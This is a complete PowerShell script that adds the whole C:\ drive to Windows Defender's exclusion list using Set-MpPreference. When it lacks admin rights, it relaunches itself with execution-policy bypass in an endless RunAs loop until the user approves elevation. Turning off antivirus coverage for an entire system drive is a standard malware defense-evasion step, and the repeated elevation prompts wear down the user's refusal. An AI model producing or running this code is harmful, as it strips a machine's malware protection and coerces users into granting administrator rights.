# Configuration Variables
$targetPath = "C:\"
$successMessage = "Successfully excluded C:\ from Windows Defender"
$verifiedMessage = "Verified: C:\ is in the exclusion list"
$warningMessage = "Warning: C:\ may not have been added"
$requestMessage = "Requesting administrator privileges..."
$deniedMessage = "Elevation denied or failed. Retrying..."
$excludedMessage = "C:\ excluded from Windows Defender"

# PowerShell execution parameters
$psExecutable = "PowerShell.exe"
$noExitFlag = "-NoExit"
$noProfileFlag = "-NoProfile"
$executionPolicyFlag = "-ExecutionPolicy Bypass"
$commandFlag = "-Command"

# Get current user identity and role
$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
$adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
$isAdmin = $principal.IsInRole($adminRole)

# Function to exclude path from Windows Defender
function Set-DefenderExclusion {
    param([string]$Path)
    Set-MpPreference -ExclusionPath $Path -Force
}

# Function to verify exclusion
function Test-DefenderExclusion {
    param([string]$Path)
    $exclusionList = (Get-MpPreference).ExclusionPath
    return $exclusionList -contains $Path
}

# Function to display colored message
function Show-Message {
    param(
        [string]$Message,
        [string]$Color = "White"
    )
    Write-Host $Message -ForegroundColor $Color
}

# Main execution logic
if ($isAdmin) {
    # Admin context - perform the exclusion
    Set-DefenderExclusion -Path $targetPath
    Show-Message -Message $successMessage -Color "Green"
    
    # Verify the exclusion was added
    if (Test-DefenderExclusion -Path $targetPath) {
        Show-Message -Message $verifiedMessage -Color "Green"
    } else {
        Show-Message -Message $warningMessage -Color "Yellow"
    }
    
    pause
    exit
}

# Non-admin context - request elevation
while ($true) {
    Show-Message -Message $requestMessage -Color "Yellow"
    
    # Build command line arguments
    $cmdParts = @(
        $noExitFlag,
        $noProfileFlag,
        $executionPolicyFlag,
        $commandFlag,
        "`"Set-MpPreference -ExclusionPath '$targetPath' -Force; Write-Host '$excludedMessage' -ForegroundColor Green; pause; exit`""
    )
    $cmdLine = $cmdParts -join " "
    
    # Attempt to start elevated process
    try {
        $processParams = @{
            FilePath     = $psExecutable
            ArgumentList = $cmdLine
            Verb         = "RunAs"
            PassThru     = $true
            WindowStyle  = "Normal"
        }
        
        $elevatedProcess = Start-Process @processParams
        
        if ($elevatedProcess) {
            exit
        }
    }
    catch {
        Show-Message -Message $deniedMessage -Color "Red"
    }
}
